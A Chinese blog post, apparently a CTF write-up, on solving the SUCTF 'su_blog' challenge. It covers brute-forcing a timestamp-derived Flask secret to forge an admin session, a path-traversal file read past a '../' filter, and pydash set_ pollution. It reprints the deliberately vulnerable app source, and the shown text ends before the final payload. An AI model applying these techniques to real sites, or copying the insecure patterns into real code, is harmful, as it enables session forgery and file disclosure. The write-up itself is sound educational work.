<!DOCTYPE html>
<html lang="zh">
  <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>suctf复现 - DashingBug</title>
  
    <link rel="shortcut icon" href="/./bug.png">
  
  
  <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="suctf复现 - DashingBug" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://dashingbug.xin/2025/06/19/suctf%E5%A4%8D%E7%8E%B0/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2025-06-18T16:00:00.000Z" />
  
  <meta property="og:article:author" content="DashingBug" />
  
  

  
  
<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">

  
  
  
<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">

  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
  
  
<link rel="stylesheet" href="/css/components/card.css">

  
  
  
  
<link rel="stylesheet" href="/css/components/button.css">

  
  
  
  
<link rel="stylesheet" href="/css/components/badge.css">

  
  
  
  
<link rel="stylesheet" href="/css/components/utilities.css">

  
  
  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  
  
  
<link rel="stylesheet" href="/css/scroll-reveal.css">

  
  
  
<link rel="stylesheet" href="/css/view-transition.css">

  
  
  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
  
<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">

  
<script src="/js/smooth-scroll.js"></script>

  

  

  <script>var ThemeCupertino = {}</script>
  
<meta name="generator" content="Hexo 7.3.0"></head>

  <body
    data-color-scheme="auto"
    data-uppercase-categories="true"
    
    data-rainbow-banner="true"
    data-rainbow-banner-shown="always"
    data-rainbow-banner-month="6"
    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
    
    data-config-root="/"
    
    data-toc="true"
    data-toc-max-depth="2"
    
    
    
    data-scroll-reveal-disappear="false"
    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
    
  >
    <a href="#main-content" id="skip-to-content">Skip to content</a>
    <nav id="theme-nav">
  <div class="inner">
    <a class="title" href="/">Space</a>
    <div class="nav-arrow"></div>
    <div class="nav-items">
      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>

      
      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
      
      <a class="nav-item" href="http://dashingbug.xin/link.html" style="--index: 2">link</a>
      
      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
      
      <a class="nav-item" href="/about" style="--index: 4">About</a>
      
      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
      
      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
      
      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
      
      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
      
      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
      
    </div>
  </div>
</nav>

    <main id="main-content">
      
<article class="post">
  <div class="meta">
    

    
    <time class="date" datetime="2025-06-19T00:00:00+08:00">
      June 19, 2025
    </time>
    

    <h1 class="title">suctf复现</h1>
  </div>

  <div class="content">
    <h2 id="su-blog"><a href="#su-blog" class="headerlink" title="su_blog"></a>su_blog</h2><p>开局有个注册页面，注册后登录</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221323752.png" alt="image-20250622132335694"></p>
<p>登录的时候有session<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221327892.png" alt="image-20250622132700852"></p>
<p>在博客的最下方有这样一句话</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221329021.png" alt="image-20250622132910977"></p>
<p>知道了secret，session是能被爆破出来的，上面的session第一个点符号之前的base64解码出来是{“username”:”用户名“}</p>
<p>博客诞生事件就是docker创建时间，写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line">starttime = timestamp -<span class="number">300000</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">dict</span> = &#123;i:hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (starttime,timestamp)&#125;</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> <span class="built_in">dict</span>.items():</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;value&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221439803.png" alt="image-20250622143947667"></p>
<p>用flask-unsign爆破一下得到secret</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221442240.png" alt="image-20250622144221210"></p>
<p>伪造cookie<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221444630.png" alt="image-20250622144455552"></p>
<p>用管理员登录只是多了个管理友链的功能，可以自己添加删除友链，添加友链的url由自己决定，我试了一下，发现好像除了能alert一下没有其他什么用了。</p>
<p>有个Articles,这里点击文章有一个任意文件读取漏洞，经过测试发现是会把..&#x2F;替换成空</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506221504827.png" alt="image-20250622150433770"></p>
<p>通过&#x2F;proc&#x2F;self&#x2F;cmdline读到启动命令为pythonapp&#x2F;app.py试着找找，成功读到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time,os,json,hashlib</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> pwaf,cwaf</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = hashlib.md5(<span class="built_in">str</span>(<span class="built_in">int</span>(time.time())).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">users = &#123;<span class="string">&quot;testuser&quot;</span>: <span class="string">&quot;password&quot;</span>&#125;</span><br><span class="line">BASE_DIR = <span class="string">&#x27;/var/www/html/myblog/app&#x27;</span></span><br><span class="line"></span><br><span class="line">articles = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="string">&quot;articles/article1.txt&quot;</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">&quot;articles/article2.txt&quot;</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">&quot;articles/article3.txt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">friend_links = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;bkf1sh&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://ctf.org.cn/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;fushuling&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://fushuling.com/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;yulate&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.yulate.com/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;zimablue&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.zimablue.life/&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;baozongwi&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://baozongwi.xyz/&quot;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">user_data = User()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blog.html&#x27;</span>, articles=articles, friend_links=friend_links)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username] == password:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid credentials&quot;</span>, <span class="number">403</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        users[username] = password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change_password&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_password</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        old_password = request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">        new_password = request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">        confirm_password = request.form[<span class="string">&#x27;confirm_password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users[session[<span class="string">&#x27;username&#x27;</span>]] != old_password:</span><br><span class="line">            flash(<span class="string">&quot;Old password is incorrect&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> new_password != confirm_password:</span><br><span class="line">            flash(<span class="string">&quot;New passwords do not match&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[session[<span class="string">&#x27;username&#x27;</span>]] = new_password</span><br><span class="line">            flash(<span class="string">&quot;Password changed successfully&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change_password.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/friendlinks&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">friendlinks</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;friendlinks.html&#x27;</span>, links=friend_links)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add_friendlink&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_friendlink</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">and</span> url:</span><br><span class="line">        friend_links.append(&#123;<span class="string">&quot;name&quot;</span>: name, <span class="string">&quot;url&quot;</span>: url&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;friendlinks&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete_friendlink/&lt;int:index&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_friendlink</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= index &lt; <span class="built_in">len</span>(friend_links):</span><br><span class="line">        <span class="keyword">del</span> friend_links[index]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;friendlinks&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    file_name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=<span class="string">&#x27;&#x27;</span>, content=<span class="string">&quot;未提供文件名。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    blacklist = [<span class="string">&quot;waf.py&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(blacklisted_file <span class="keyword">in</span> file_name <span class="keyword">for</span> blacklisted_file <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;大黑阔不许看&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> file_name.startswith(<span class="string">&#x27;articles/&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;无效的文件路径。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_name <span class="keyword">not</span> <span class="keyword">in</span> articles.values():</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="string">&quot;无权访问该文件。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    file_path = os.path.join(BASE_DIR, file_name)</span><br><span class="line">    file_path = file_path.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        content = <span class="string">&quot;文件未找到。&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;Error reading file <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        content = <span class="string">&quot;读取文件时发生错误。&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, file_name=file_name, content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Admin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;pass&#x27;</span>)!=<span class="string">&quot;SUers&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            body = request.json</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> body:</span><br><span class="line">                flash(<span class="string">&quot;No JSON data received&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;No JSON data received&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            key = body.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">            value = body.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flash(<span class="string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> pwaf(key):</span><br><span class="line">                flash(<span class="string">&quot;Invalid key format&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid key format&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cwaf(value):</span><br><span class="line">                flash(<span class="string">&quot;Invalid value format&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid value format&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            set_(user_data, key, value)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">&quot;User data updated successfully&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;User data updated successfully&quot;</span>&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">            flash(<span class="string">&quot;Invalid JSON data&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid JSON data&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flash(<span class="string">f&quot;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">f&quot;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, user_data=user_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    flash(<span class="string">&quot;You have been logged out.&quot;</span>, <span class="string">&quot;info&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>Admin路由下_set函数会造成原型链污染</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506241657098.png" alt="image-20250624165745971"></p>
<p>会根据你上传的Path和value给object对应的属性进行创建或赋值</p>
<p>user_data是一个user实例，但是源码中对key和value都进行了waf</p>
<p>最终payload</p>
